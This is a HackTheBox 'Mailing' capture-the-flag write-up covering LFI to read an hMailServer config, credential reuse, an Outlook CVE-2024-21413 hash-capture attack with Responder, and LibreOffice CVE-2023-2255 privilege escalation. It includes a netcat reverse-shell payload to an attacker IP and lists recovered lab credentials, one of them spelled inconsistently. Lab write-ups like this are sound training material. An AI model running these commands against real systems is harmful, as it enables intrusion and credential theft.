---
title: "Mailing"
date: 2026-01-07
draft: false
description: "HackTheBox Mailing writeup"
tags: ["hackthebox", "htb", "windows", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Mailing

## Overview

- **OS:** Windows
- **IP:** 10.129.24.210
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

path traversal led to file disclosure that led us to a config file which we got creds from to access the mail server.

## Loot

| **Takeaways** |  |  |
| --- | --- | --- |
| **Usernames** |  |  |
| IT | Ruy Alonso |  |
| Support | Maya Bendito | maya@mailing.htb |
| CEO | Gregory Smith |  |
| **Username+pass** |  |  |
| AdministratorPassword= | 841bb5acfa6779ae432fd7a4e6600ba7 | homenetworkingadministrator |
| Mysql | 0a9f8ad8bf896b501dde74f08efd7e4c |  |
| maya |  | m4y4ngs4ri |

using a cve we senmt a mail that gave us a hash
passed the hash to get rce and privesc with libreoffice vulnerability

## Enumeration
- **nmap scan**

{{< figure src="image 271.png" >}}

### Port 80

{{< figure src="image 272.png" >}}

{{< figure src="image 273.png" >}}

By testing out a directory from

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/dotdotpwn.txt

we are able to identify LFI because it returned us the .ini file

{{< figure src="image 274.png" >}}

## Vulnerabilities
## Exploitation


We will use the LFI we found earlier to read the .ini file for hmailserver  and see if we can find something interesting

lets check ../../../../Progra~2\hMailServer\Bin\MailServer.ini

boom we have the config file

{{< figure src="image 275.png" >}}

```
    [Directories]
    
    ProgramFolder=C:\Program Files (x86)\hMailServer
    
    DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
    
    DataFolder=C:\Program Files (x86)\hMailServer\Data
    
    LogFolder=C:\Program Files (x86)\hMailServer\Logs
    
    TempFolder=C:\Program Files (x86)\hMailServer\Temp
    
    EventFolder=C:\Program Files (x86)\hMailServer\Events
    
    [GUILanguages]
    
    ValidLanguages=english,swedish
    
    [Security]
    
    AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
    
    [Database]
    
    Type=MSSQLCE
    
    Username=
    
    Password=0a9f8ad8bf896b501dde74f08efd7e4c
    
    PasswordEncryption=1
    
    Port=0
    
    Server=
    
    Database=hMailServer
    
    Internal=1
    
```

lets check the creds we got with swaks 

s`waks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb`

{{< figure src="image 276.png" >}}

great it shows that the creds are valid.

hmm lets look at any CVE for windows mail

`git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability`

python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.28\share\sploit" --subject "Check it"

lets run responder to capture it

sudo responder -I tun0

{{< figure src="image 277.png" >}}

there we captured the hash

lets crack it with hashcat

{{< figure src="image 278.png" >}}

boom we got creds as m4yr4ngsri

lets try to connect with winrm

{{< figure src="image 279.png" >}}

After finding a old version of libre office under programs, being used we can start Exploiting libre using this CVE

`python /opt/CVE-2023-2255/CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.6 443' --output exploit.odt`

lets upload the doc to smb share

smbclient '[//10.10.11.14/important](https://10.10.11.14/important) documents' --user maya --password m4y4ngs4ri

{{< figure src="image 280.png" >}}
